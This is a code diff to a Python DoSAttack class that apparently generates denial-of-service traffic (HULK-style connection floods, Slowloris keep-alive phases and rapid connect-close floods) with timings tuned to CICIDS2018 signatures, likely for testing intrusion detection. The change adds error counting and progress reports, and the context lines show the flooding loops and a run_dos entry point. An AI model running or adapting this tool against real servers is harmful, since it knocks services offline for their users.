@@ -91,11 +91,19 @@ class DoSAttack:
         self.duration = duration
         self.running = True
         self.request_count = 0
+        self.error_count = 0
+        self.last_error = ""
         self.lock = threading.Lock()
 
     def _inc_count(self, n=1):
         with self.lock:
             self.request_count += n
+
+    def _inc_error(self, err_msg=""):
+        with self.lock:
+            self.error_count += 1
+            if err_msg:
+                self.last_error = err_msg
 
     # ──────────────────────────────────────────────────────
     # HULK — Rapid TCP connection flood, mostly SYN+close
@@ -176,8 +184,8 @@ class DoSAttack:
                         pass
 
                 sock.close()
-            except Exception:
-                pass
+            except Exception as e:
+                self._inc_error(str(e))
 
             # Rapid-fire: ~8ms between connections (matching training Flow Duration median)
             time.sleep(random.uniform(0.005, 0.015))
@@ -221,8 +229,8 @@ class DoSAttack:
                 
                 # Slight delay between opening connections
                 time.sleep(random.uniform(0.01, 0.05))
-            except Exception:
-                pass
+            except Exception as e:
+                self._inc_error(str(e))
 
         # Phase 2: Keep connections alive by periodically sending header lines
         while self.running and time.time() < end_time:
@@ -236,8 +244,8 @@ class DoSAttack:
                         self._inc_count()
                     
                     alive.append(sock)
-                except Exception:
-                    pass  # Server closed the connection
+                except Exception as e:
+                    self._inc_error(str(e))  # Server closed the connection
 
             sockets = alive
 
@@ -259,8 +267,8 @@ class DoSAttack:
                     sock.sendall(partial.encode())
                     sockets.append(sock)
                     self._inc_count()
-                except Exception:
-                    pass
+                except Exception as e:
+                    self._inc_error(str(e))
 
             # CORRECT CICIDS2018: 10-15 second keep-alive intervals (SLOW!)
             # This creates high Fwd IAT Mean which matches Slowloris signature
@@ -376,8 +384,8 @@ class DoSAttack:
 
                 # Close after all requests
                 sock.close()
-            except Exception:
-                pass
+            except Exception as e:
+                self._inc_error(str(e))
 
             # Brief pause between connections (0.1-0.3s)
             time.sleep(random.uniform(0.1, 0.3))
@@ -417,8 +425,8 @@ class DoSAttack:
                 
                 # Immediately close — training shows 0 payload, ~3µs flows
                 sock.close()
-            except Exception:
-                pass
+            except Exception as e:
+                self._inc_error(str(e))
 
             # Minimal delay — training shows 333K+ fwd pkts/sec
             time.sleep(random.uniform(0.001, 0.005))
@@ -454,8 +462,8 @@ class DoSAttack:
                 
                 sock.close()
                 
-            except Exception:
-                pass
+            except Exception as e:
+                self._inc_error(str(e))
             
             # Sleep 0.3-0.5 sec between bursts
             time.sleep(random.uniform(0.3, 0.5))
@@ -492,14 +500,42 @@ class DoSAttack:
             t.start()
             threads.append(t)
 
+        # Progress reporting while threads run
         start_time = time.time()
-        for t in threads:
-            remaining = max(1, self.duration - (time.time() - start_time) + 5)
-            t.join(timeout=remaining)
+        report_interval = 10  # seconds
+        next_report = start_time + report_interval
+
+        while True:
+            # Check if all threads finished
+            alive = [t for t in threads if t.is_alive()]
+            if not alive:
+                break
+
+            now = time.time()
+            elapsed = now - start_time
+
+            # Periodic progress report
+            if now >= next_report:
+                with self.lock:
+                    reqs = self.request_count
+                    errs = self.error_count
+                    last_err = self.last_error
+                print(f"[DoS] {elapsed:.0f}s elapsed | {reqs} requests | {errs} errors | {len(alive)} threads alive")
+                if errs > 0 and last_err:
+                    print(f"[DoS]   Last error: {last_err}")
+                next_report = now + report_interval
+
+            # Don't spin-wait
+            time.sleep(1)
 
         self.running = False
         elapsed = time.time() - start_time
-        print(f"[DoS] Attack completed in {elapsed:.2f}s — Sent {self.request_count} requests")
+        print(f"[DoS] Attack completed in {elapsed:.2f}s — Sent {self.request_count} requests, {self.error_count} errors")
+        if self.error_count > 0:
+            print(f"[DoS] Last error was: {self.last_error}")
+        if self.request_count == 0 and self.error_count > 0:
+            print(f"[DoS] WARNING: Zero successful requests! All connections failed.")
+            print(f"[DoS] Check: target IP reachable? port open? firewall?")
 
 
 def run_dos(target_ip, target_port=80, duration=60, threads=5):
